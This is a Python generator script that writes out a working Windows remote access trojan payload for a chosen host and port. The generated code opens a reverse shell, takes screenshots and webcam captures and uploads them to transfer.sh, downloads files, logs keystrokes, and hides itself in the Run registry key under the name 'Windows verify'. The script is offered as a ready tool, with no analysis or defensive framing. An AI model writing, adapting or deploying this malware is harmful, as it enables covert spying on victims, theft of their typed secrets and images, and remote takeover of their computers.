from sys import argv

def generate_payload(host,port,file_name):
    payload ="""from cv2 import VideoCapture, imwrite
from pynput.keyboard import Key, Listener
from os.path import realpath
from winreg import *
import socket,os,subprocess,pyautogui,time,requests,numpy,idna
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('"""+host+"""', """+port+"""))
keyLog = str()
def start():
    global listener
    listener = Listener(on_press=on_press)
    listener.start()
def on_press(key):
    global keyLog
    keyLog+=str(key).replace("'","").replace('Key.space',' ').replace('Key.ctrl_l','<ctrl>').replace('Key.shift','<shift>').replace('Key.enter','\\n').replace('Key.backspace',' <bck>').replace('Key.esc','<esc>')  
def dump():
    global keyLog
    dump = keyLog.replace('<shift>1','!').replace('<shift>2','@').replace('<shift>3','#').replace('<shift>4','$').replace('<shift>5','%%').replace('<shift>7','&').replace('<shift>8','*').replace('<shift>9','(').replace('<shift>0',')')
    keyLog = ""
    return dump
def stop():
    global listener
    listener.stop()
def persistence(executable):
    path_file='"%s"'%realpath(executable)
    run = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
    try:
        key = OpenKey(HKEY_CURRENT_USER,run,0,KEY_SET_VALUE)
    except PermissionError:
        return('Failed!\\nRequire admin privileges')
    else:
        SetValueEx(key,'Windows verify',0,REG_SZ,path_file+' -silent')
        key.Close()        
while True:
    conn = s.recv(1024).decode('utf-8')
    if conn.startswith('shell:'):
        conn = conn[6:]
        if conn[:3] == 'cd ':
            os.chdir(conn[3:])
            conn = 'cd'      
        proc = subprocess.Popen(conn, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.DEVNULL, shell=True)
        stdout, stderr = proc.communicate()
        cmd = stdout+stderr
        if len(cmd) == 0:
            cmd = conn.encode()
        s.send(cmd)
    if conn == 'screenshot':
        runtime = time.asctime()[11:].replace(' ','-').replace(':','-')
        filename = 'screenshot-%s.png'%runtime
        url = 'https://transfer.sh/'
        sc = pyautogui.screenshot()
        sc.save(filename)
        data = open(filename, 'rb')
        upload = {filename: data}
        response = requests.post(url, files=upload)
        download_link = response.content.decode('utf-8')
        data.close()
        os.system('del '+filename)
        s.send(download_link.encode())
    if conn == 'webcam':
        url = 'https://transfer.sh/'
        runtime = time.asctime()[11:].replace(' ','-').replace(':','-')
        filename = 'webcamshot-%s.jpg'%runtime
        cam = VideoCapture(0)   
        x, img = cam.read()
        if x:   
            imwrite(filename,img) 
        data = open(filename, 'rb')
        upload = {filename: data}
        response = requests.post(url, files=upload)
        download_link = response.content.decode('utf-8')
        data.close()
        os.system('del '+filename)
        s.send(download_link.encode())
    if conn.startswith('file:'):
        url = conn[5:]
        filename = url[26:]
        content = requests.get(url).content
        with open(filename, 'wb') as f:
            f.write(content)
            f.close()
    if conn.startswith('keylogger:'):
        args = conn[10:]
        if args == 'start':
            start()
        if args == 'dump':
            text = dump()
            s.send(text.encode())
        if args == 'stop':
            stop()
    if conn == 'persistence':
        filename = os.path.realpath(__file__)
        code = persistence(filename)
        if code != None:
            s.send('Error!'.encode())
        else:
            s.send('Persistence execute with success!'.encode())"""
    
    with open(file_name,'w') as payload_file:
        payload_file.write(payload)
        payload_file.close()
    print('Writed %i bytes payload to %s'%(len(payload.encode()),file_name))

if len(argv) >= 4:
    host = argv[1]
    port = argv[2]
    file_name = argv[3]
    generate_payload(host,port,file_name)
else:
    print('Usage: payloader.py <lhost> <lport> <payload_name.py>')
    print()